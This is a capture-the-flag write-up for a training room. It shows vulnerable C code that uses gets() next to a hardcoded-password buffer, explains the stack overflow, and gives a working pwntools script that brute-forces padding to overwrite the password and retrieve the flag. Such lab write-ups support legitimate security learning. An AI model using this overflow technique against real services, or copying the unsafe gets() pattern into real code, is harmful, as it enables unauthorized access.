# [Flag Vault](https://tryhackme.com/room/hfb1flagvault)

## Understand the basics of buffer overflows.

Cipher asked me to create the most secure vault for flags, so I created a vault that cannot be accessed. You don't believe me? Well, here is the code with the password hardcoded. Not that you can do much with it anymore.

You can use the following command to connect to the machine:

```
nc <TARGET_IP> 1337
```

Download the source code from [here](https://drive.google.com/file/d/1kYIR2JEfLfbzifHgpGBj2xuBgGxNLp46/view?usp=sharing).

_This challenge was originally a part of the Hackfinity Battle 2025 CTF Event._

### What is the flag?

1. Analyze the source code. The `login()` function declares two 100-byte buffers on the stack: `password` and `username`. Because `password` is declared first and the stack grows downward, it resides at a higher address than `username`. The flag is only printed when both `strcmp` checks pass, but the password prompt is commented out, so there is no way to supply `password` legitimately. The critical flaw is the use of the unsafe `gets()` function to read `username`: `gets()` performs no bounds checking and will write as many bytes as the user provides, allowing it to overflow past the end of the `username` buffer and directly into the `password` buffer above it.

```c
#include <stdio.h>
#include <string.h>

void print_banner(){
	printf( "  ______ _          __      __         _ _   \n"
 		" |  ____| |         \\ \\    / /        | | |  \n"
		" | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
		" |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
		" | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
		" |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
		"                  __/ |                      \n"
		"                 |___/                       \n"
		"                                             \n"
		"Version 1.0 - Passwordless authentication evolved!\n"
		"==================================================================\n\n"
	      );
}

void print_flag(){
	FILE *f = fopen("flag.txt","r");
	char flag[200];

	fgets(flag, 199, f);
	printf("%s", flag);
}

void login(){
	char password[100] = "";
	char username[100] = "";

	printf("Username: ");
	gets(username);

	// If I disable the password, nobody will get in.
	//printf("Password: ");
	//gets(password);

	if(!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte")){
		print_flag();
	}
	else{
		printf("Wrong password! No flag for you.");
	}
}

void main(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	// Start login process
	print_banner();
	login();

	return;
}
```

2. Craft the overflow payload. The payload is structured as three parts: `bytereaper\x00`, a run of filler bytes `A`, and then the correct password `5up3rP4zz123Byte`. The null byte after `bytereaper` terminates the string so that `strcmp(username, "bytereaper")` returns 0. The filler bytes fill the remainder of the `username` buffer plus any compiler-added alignment padding between the two arrays, placing the next bytes exactly at the start of `password`. The correct password string then overwrites `password[0..15]`, satisfying the second `strcmp` check. Because the exact gap between the two buffers can vary depending on compiler version and optimization flags, the script brute-forces padding lengths from 84 to 120 bytes and stops as soon as the response does not contain "Wrong password".

```py
from pwn import *

for pad in range(84, 120):
    p = remote('<TARGET_IP>', 1337)
    payload = b'bytereaper\x00' + b'A'*pad + b'5up3rP4zz123Byte'
    p.sendline(payload)
    resp = p.recvall(timeout=2)
    if b'Wrong password' not in resp:
        print(f"[+] Correct padding: {pad}")
        print(resp.decode())
        break
    else:
        print(f"[-] pad={pad}: failed")
    p.close()
```

[SCREEN01]
